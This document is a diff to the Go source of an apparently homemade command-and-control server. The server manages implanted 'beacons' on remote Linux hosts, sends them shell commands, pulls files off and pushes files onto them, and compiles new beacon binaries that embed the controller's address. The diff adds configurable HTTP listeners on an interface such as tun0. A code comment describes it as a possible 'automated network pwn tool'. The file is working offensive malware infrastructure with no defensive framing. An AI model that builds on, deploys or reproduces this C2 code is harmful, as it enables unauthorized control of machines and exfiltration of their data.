@@ -1,23 +1,14 @@
 package main
 
 import (
-	"github.com/gorilla/mux"
-	"bytes"
-	"mime"
 	"fmt"
 	"time"
-	"log"
-	"encoding/json"
-	"net/http"
+	"net"
 	"strconv"
 	"os"
-	"io"
 	"os/exec"
 	"strings"
 	"bufio"
-	"io/ioutil"
-	"path/filepath"
-	b64 "encoding/base64"
 )
 
 type CommandUpdate struct {
@@ -36,16 +27,20 @@ type Beacon struct {
 	LastSeen time.Time
 }
 
+var listeners []HttpListener = make([]HttpListener, 0)
 var beacons []*Beacon = make([]*Beacon, 0)
 var activeBeacon *Beacon
 var cmdArgs = map[string]string {
     "help": "<command>...",
 	"list": "",
+	"listeners": "",
+	"httplistener": "<iface> <hostname> <port>",
     "exec": "<beacon id OR index> <command>...",
-    "create": "<LHOST> <LPORT>",
+    "create": "<listener>",
 	"download": "<beacon id OR index> <remote file> OR <remote file>...",
 	"upload": "<beacon id OR index> <local file> OR <local file>...",
 	"use": "<beacon id OR index>",
+	"script": "<beacon id OR index> <local file path> <remote executor path>",
 }
 
 /*
@@ -56,116 +51,10 @@ potentially turn into automated network pwn tool?
 
 */
 
-func receiveFile(beacon *Beacon, w http.ResponseWriter, r *http.Request) {
-    r.ParseMultipartForm(32 << 20)
-    var buf bytes.Buffer
-    file, header, err := r.FormFile("file")
-	
-	if err != nil {
-        fmt.Println("Failed to receive file.")
-		return
-    }
-
-    defer file.Close()
-    name := strings.Split(header.Filename, "/")
-    io.Copy(&buf, file)
-    saveBeaconFile(beacon, buf, name[len(name)-1])
-    buf.Reset()
-}
-
-func saveBeaconFile(beacon *Beacon, data bytes.Buffer, name string) {
-	path := "downloads"
-	if _, err := os.Stat(path); os.IsNotExist(err) {
-		os.Mkdir(path, 0700)
-	}
-	path += "/" + beacon.Ip
-	if _, err := os.Stat(path); os.IsNotExist(err) {
-		os.Mkdir(path, 0700)
-	}
-	path += "/" + beacon.Id
-	if _, err := os.Stat(path); os.IsNotExist(err) {
-		os.Mkdir(path, 0700)
-	}
-
-	err := ioutil.WriteFile(path + "/" + name, data.Bytes(), 0644)
-    if err != nil {
-		fmt.Println("Failed to save file.")
-	}
-
-	cwd, err := os.Getwd()
-
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	fmt.Println("Saved " + name + " from " + beacon.Id + "@" + beacon.Ip + " to " + cwd + "/" + path + "/" + name)
-}
-
-func beaconUploadHandler(w http.ResponseWriter, r *http.Request) {
-	fmt.Println("Serving file to beacon.")
-	file := mux.Vars(r)["data"]
-	plaintext, _ := b64.StdEncoding.DecodeString(file)
-	fullPath := string(plaintext)
-
-	if plaintext[0] != '/' {
-		path, err := os.Getwd()
-		if err != nil {
-			log.Fatal(err)
-		}
-		fullPath = path + "/uploads/" + string(plaintext)
-	}
-
-	w.Header().Set("Content-Type", mime.TypeByExtension(filepath.Ext(fullPath)))
-	http.ServeFile(w, r, fullPath)
-}
-
-func beaconGetHandler(w http.ResponseWriter, r *http.Request) {
-	var update CommandUpdate
-	data := mux.Vars(r)["data"]
-	respMap := make(map[string][]string)
-	decoded, _ := b64.StdEncoding.DecodeString(data)
-	json.Unmarshal(decoded, &update)
-	beacon := registerBeacon(update)
-	decodedData, _ := b64.StdEncoding.DecodeString(update.Data)
-
-	respMap["exec"] = beacon.ExecBuffer
-	respMap["download"] = beacon.DownloadBuffer
-	respMap["upload"] = beacon.UploadBuffer
-
-	json.NewEncoder(w).Encode(respMap)
-	beacon.ExecBuffer = nil
-	beacon.DownloadBuffer = nil
-	beacon.UploadBuffer = nil
-
-	if len(update.Data) > 0 {
-		if update.Type == "exec" {
-			out := strings.Replace(string(decodedData), "\n", "\n\t", -1)
-			fmt.Println("\n[+] Beacon " + update.Id + "@" + update.Ip + " " + update.Type + ":")
-			fmt.Println("\t" + out[:len(out)-1])
-		} else if update.Type == "upload" {
-			if(decodedData[0] == '1') {
-				f := strings.Split(string(decodedData), ";")
-				fmt.Println("Uploaded file to " + beacon.Id + "@" + beacon.Ip + ":" + f[1])
-			} else if(decodedData[0] == '0') {
-				fmt.Println("Failed to upload file to " + beacon.Id + "@" + beacon.Ip)
-			}
-		}
-		prompt()
-	}
-}
-
-func beaconPostHandler(w http.ResponseWriter, r *http.Request) {
-	var update CommandUpdate
-	data := mux.Vars(r)["data"]
-	decoded, _ := b64.StdEncoding.DecodeString(data)
-	
-	json.Unmarshal(decoded, &update)
-	beacon := registerBeacon(update)
-
-	if update.Type == "upload" {
-		fmt.Println("Receiving " + update.Data + " from " + beacon.Id)
-		receiveFile(beacon, w, r)
-	}
+func getIfaceIp(iface string) (string) {
+	ief, _ := net.InterfaceByName(iface)
+	addrs, _ := ief.Addrs()
+	return strings.Split(addrs[0].String(), "/")[0]
 }
 
 func registerBeacon(updateData CommandUpdate) (*Beacon) {
@@ -192,9 +81,11 @@ func listBeacons() {
 	}
 }
 
-func createBeacon(lhost string, lport string) {
-	exec.Command("/bin/sh", "-c", "rm out/*").Output()
-	exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags '-X main.cmdAddress=" + lhost + " -X main.cmdPort=" + lport + " -X main.cmdHost=command.com' -o out/beacon beacon/*.go").Output()
+func createBeacon(listener int) {
+	ip := getIfaceIp(listeners[listener].iface)
+	port := strconv.Itoa(listeners[listener].port)
+	beaconName := "beacon" + ip + "." + port
+	exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags '-X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go").Output()
 	fmt.Println("Created beacon in out directory.")
 }
 
@@ -315,14 +206,55 @@ func printHelp(cmd []string) {
 	}
 }
 
+func startHttpListener(cmd []string) {
+	port, err := strconv.Atoi(cmd[3])
+
+	if err != nil {
+		fmt.Println("usage: " + cmdArgs["httplistener"])
+		return
+	}
+
+	var HttpListener = HttpListener {
+		iface: cmd[1],
+		hostname: cmd[2],
+		port: port,
+	}
+
+	err = HttpListener.startListener()
+	if err != nil {
+		fmt.Println("Failed to start http server.")
+	}
+
+	fmt.Println("Started HTTP listener for " + getIfaceIp(HttpListener.iface) + ":" + cmd[3])
+	listeners = append(listeners, HttpListener)
+}
+
+func listListeners() {
+	fmt.Println("---- HTTP Listeners ----")
+	for i, listener := range listeners {
+		fmt.Println("[" + strconv.Itoa(i) + "] " + getIfaceIp(listener.iface) + ":" + strconv.Itoa(listener.port) + " (" + listener.iface + ")")
+	}
+}
+
 func processInput(input string) {
 	cmd := strings.Fields(input);
 	if len(cmd) > 0 && checkArgs(cmd) {
 		switch cmd[0] {
+		//case "script":
+			//uploadAndExec(cmd)
+		case "listeners":
+			listListeners()
+		case "httplistener":
+			startHttpListener(cmd)
 		case "exec":
 			execOnBeacon(cmd)
 		case "create":
-			createBeacon(cmd[1], cmd[2])
+			l, err := strconv.Atoi(cmd[1])
+			if err != nil {
+				fmt.Println("usage: " + cmdArgs["create"])
+				return
+			}
+			createBeacon(l)
 		case "list":
 			listBeacons()
 		case "upload":
@@ -372,6 +304,18 @@ func handleInput() {
 }
 
 func main() {
-	startServerRoutine()
+	
+	var HttpListener = HttpListener {
+		iface: "tun0",
+		hostname: "command.com",
+		port: 8001,
+	}
+
+	var err = HttpListener.startListener()
+	if err != nil {
+		fmt.Println("Failed to start http server.")
+	}
+
+	listeners = append(listeners, HttpListener)
 	handleInput()
 }
